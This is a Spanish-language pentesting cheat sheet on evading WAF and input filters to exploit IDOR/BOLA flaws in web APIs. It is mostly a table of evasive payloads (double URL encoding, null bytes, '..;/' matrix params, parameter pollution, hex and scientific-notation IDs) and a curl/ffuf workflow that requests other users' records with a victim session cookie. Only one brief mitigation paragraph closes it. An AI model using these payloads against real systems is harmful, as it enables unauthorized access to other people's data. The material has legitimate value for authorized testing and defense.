---
aliases:
tags:
  - vuln/idor
  - technique/discovery
  - asset/api
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[BOLA - IDOR]]"
---
# IDOR - Técnicas de Evasión y Bypass de Filtros

---

## Cheatsheet

| **Payload evasivo** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `id=%2531%2530%2536` | Double URL encoding — `%25` decode → `%31%30%36` → `106` | WAF decode una vez, backend decode dos. |
| `{"id": "106"}` | Unicode escapes en JSON — bypass regex `\d+` | Parser JSON resuelve escapes post-WAF. |
| `?name=106.pdf%00.jpg` | Null byte trunca extensión "permitida" | Backend C/PHP legacy con strcmp byte-aware. |
| `?id=%20106%0a` | Whitespace/newline padding — backend hace `trim()` post-validación | WAF regex strict `^\d+$`. |
| `GET /api/users/105/..;/106` | Matrix param `..;/` — proxy normaliza distinto que backend | Tomcat/Jetty con path-param parsing. |
| `GET /api/./users/106` | Path normalization differential | Reverse proxy laxo. |
| `{"user_id": 1.06e2}` | Notación científica — `1.06e2 == 106` en JS/Python | Backend con type juggling automático. |
| `{"user_id": 0x6a}` | Hex literal — `0x6a == 106` en parser JSON lax | Edge parsers. |
| `?id=105;id=106` | Param smuggling con `;` — proxy ignora, backend procesa | Apache vs Tomcat parsing differential. |
| `?id=106&id=105` (orden invertido) | HPP — algunos parsers usan último valor | Backend Express + bodyParser inconsistente. |
| `id=106 ` (con espacio trailing) | Type coercion → `int("106 ") = 106` Python | Validación strict `==` falla, conversion lo acepta. |
| `id=00000106` | Padding numérico — bypass de equality strict | Validación `id !== "106"` falla con `"00000106"`. |
^idor-filtros

### Workflow

```bash
# 1. Mapear comportamiento del filtro con probes inocuos
for payload in '106' '106 ' ' 106' '00000106' '0x6a' '1.06e2' '106;'; do
  RES=$(curl -sI "https://target/api/users/$payload")
  echo "$payload → $(echo $RES | grep -E '^HTTP/')"
done

# 2. Double encoding test
curl -s "https://target/api/users/%2531%2530%2536" \
  -H 'Cookie: session=USER_A'

# 3. Matrix param bypass
curl -s "https://target/api/users/105/..;/106" \
  -H 'Cookie: session=USER_A'

# 4. HPP variants
ffuf -w payloads.txt -u "https://target/api?id=105&id=FUZZ" -H 'Cookie: ...'

# 5. Burp Intruder con Hackvertor — múltiples encodings serial
```

### Mitigación

Normalización pre-validación obligatoria (URL decode + Unicode normalize + type cast strict). Allowlist > blacklist. **Defensa en profundidad** — WAF no debe ser único control, autz a nivel modelo es la verdad.

---
